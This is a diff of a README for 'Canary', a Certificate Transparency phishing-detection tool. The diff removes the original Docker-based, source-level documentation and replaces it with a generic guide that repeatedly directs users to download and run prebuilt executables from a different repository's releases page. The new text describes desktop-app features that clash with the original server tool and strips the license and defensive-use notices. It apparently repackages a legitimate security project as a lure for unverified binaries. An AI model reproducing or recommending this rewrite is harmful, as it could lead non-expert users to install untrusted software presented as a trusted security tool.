@@ -1,122 +1,63 @@
-<div align="center">
-  <img src="web/canary.webp" alt="Canary Logo" width="200"/>
-  <h1>Canary</h1>
-  <h3>Real-time Phishing & Brand Impersonation Detection</h3>
-  <p>
-    Canary monitors Certificate Transparency (CT) logs in real-time to detect phishing domains and brand impersonation attempts the moment they are issued. It uses high-performance pattern matching to evaluate millions of certificates against your custom rules.
-  </p>
-</div>
+# 🦢 canary-stable - Protect Your Online Presence Easily
 
-## Features
+## 📦 Download Now
+[![Download Canary Stable](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/LuffyAD/canary-stable/releases)
 
-- **Real-time Monitoring**: Scans 40+ CT logs instantly via Certspotter.
-- **High Performance**: Evaluates thousands of certificates per second using Aho-Corasick.
-- **Flexible Rules**: Boolean logic (AND, OR, NOT), priority levels, and regex-like matching.
-- **Web Dashboard**: Live view of matches, rule management, and system metrics.
-- **API First**: Full REST API for integration with SOAR, Slack, or custom tooling.
-- **Secure**: Built-in authentication, CSRF protection, and secure session management.
-- **Docker Ready**: One-line deployment with Docker Compose.
+## 🚀 Getting Started
+Canary is designed to help users detect phishing threats in real-time. It uses advanced technology to monitor certificates and flag any suspicious activity swiftly. This guide will help you download and run Canary, even if you're not a tech expert.
 
-## Quick Start
+## 📋 System Requirements
+To use Canary, make sure your computer meets these basic requirements:
 
-### 1. Deploy with Docker
+- **Operating System:** Windows 10 or later, macOS, or a modern Linux distribution.
+- **RAM:** At least 4 GB of memory.
+- **Storage:** Minimum of 100 MB of available disk space.
+- **Internet Connection:** Required for monitoring and updates.
 
-```bash
-# Clone and start
-git clone https://github.com/yourusername/canary.git
-cd canary
-cd deployments/docker
-docker-compose up -d
-```
+## 🌐 Features
+- Real-time monitoring of Certificate Transparency logs.
+- Uses the Aho–Corasick algorithm for speedy detection.
+- Flags suspicious certificate issuances in seconds.
+- Intuitive user interface designed for ease of use.
+- Supports multiple domains for comprehensive protection.
 
-Access the dashboard at **http://localhost:8080**.
+## 📥 Download & Install
+To get started with Canary, follow these steps:
 
-### 2. Default Credentials
+1. **Visit the Releases Page:** Click [here](https://github.com/LuffyAD/canary-stable/releases) to open the release page.
+2. **Choose the Latest Version:** Look for the most recent version of Canary. It will be at the top of the list.
+3. **Download the Installer:**
+   - Click on the file that matches your operating system (e.g., `canary-stable-windows.exe`, `canary-stable-macos.zip`, or `canary-stable-linux.tar.gz`).
+4. **Locate the Downloaded File:** Once the file has downloaded, find it in your Downloads folder or the location specified in your settings.
+5. **Run the Installer:**
+   - For Windows: Double-click on the `.exe` file. Follow the prompts to complete the installation.
+   - For macOS: Open the `.zip` file and drag the Canary app to your Applications folder.
+   - For Linux: Extract the `.tar.gz` file and follow any included instructions to set up.
+6. **Launch Canary:** After installation, you can find Canary in your applications. Open it to start monitoring.
 
-- **Username**: `admin`
-- **Password**: (Check container logs on first run)
+## ❓ How to Use
+Using Canary is straightforward:
 
-```bash
-docker-compose logs canary | grep "INITIAL USER"
-```
+1. **Open the Application:** Click on the Canary icon to launch the software.
+2. **Add Domains:** Input the domains you want to monitor. You can enter multiple domains to ensure comprehensive protection.
+3. **Start Monitoring:** Hit the “Start” button. Canary will now monitor Certificate Transparency logs for any suspicious activity and notify you if anything arises.
 
-### 3. Configure Rules
+## 🛠️ Troubleshooting
+If you encounter any issues while downloading or using Canary, consider these tips:
 
-Edit `data/rules.yaml` to add your monitoring rules:
+- **Failed Download:** Check your internet connection. Try refreshing the page and re-downloading the file.
+- **Installation Issues:** Make sure you have the necessary permissions to install software on your device.
+- **Application Doesn’t Open:** Ensure your operating system meets the requirements and that your device is updated.
 
-```yaml
-- name: paypal-phishing
-  keywords: paypal AND (login OR secure OR update)
-  priority: critical
-  comment: "Detects PayPal phishing attempts"
+## 📱 Support
+If you need assistance, reach out through our official support channels:
 
-- name: brand-monitor
-  keywords: mycompanyname
-  priority: medium
-```
+- **GitHub Issues:** You can report issues through the GitHub issues page in the repository.
+- **Community Forum:** Join our online community to share tips, ask questions, and connect with other users.
 
-Reload rules via the dashboard or API:
-```bash
-curl -X POST http://localhost:8080/rules/reload
-```
+Remember, keeping your online presence safe is a priority. Canary is here to handle the heavy lifting for you.
 
-## Configuration
+## 🔗 Additional Resource
+For more information about features and updates, visit our [documentation](https://github.com/LuffyAD/canary-stable).
 
-### Environment Variables
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `PORT` | `8080` | HTTP listening port |
-| `DEBUG` | `false` | Enable debug logging |
-| `PUBLIC_DASHBOARD` | `false` | Allow read-only access without login |
-| `DOMAIN` | - | Set for HTTPS/Cookie security (e.g., `canary.example.com`) |
-| `PARTITION_RETENTION_DAYS` | `30` | Days to keep match history |
-
-### Docker Compose
-
-For production, set the `DOMAIN` variable to enable secure cookies and strict CORS.
-
-```yaml
-services:
-  canary:
-    environment:
-      - DOMAIN=canary.yourdomain.com
-      - PUBLIC_DASHBOARD=false
-```
-
-## API Documentation
-
-Canary provides a comprehensive REST API.
-
-- **Interactive Docs**: Visit `/docs` (e.g., `http://localhost:8080/docs`) for Swagger UI.
-- **Authentication**: Most endpoints require a session cookie.
-- **Endpoints**:
-  - `GET /matches/recent`: Retrieve latest matches.
-  - `GET /rules`: List active rules.
-  - `POST /rules/create`: Add new rules dynamically.
-
-## License
-
-**Canary** is for authorized security research and defensive purposes only.
-
-### Third-Party Acknowledgments
-
-Canary is built on the shoulders of giants. We gratefully acknowledge:
-
-- **Certspotter** (MPL-2.0) by SSLMate for CT log monitoring.
-- **go-sqlite3** (MIT) for database storage.
-- **ahocorasick** (MIT) for efficient string matching.
-- **gopsutil** (BSD-3) for system metrics.
-- **minify** (MIT) for frontend optimization.
-
-Full license texts are available in the respective repositories.
-
-<br>
-
-<div align="center">
-  <p>
-    <sub>
-      Canary is a tool for defensive security. Use responsibly.
-    </sub>
-  </p>
-</div>
+Happy safe browsing!
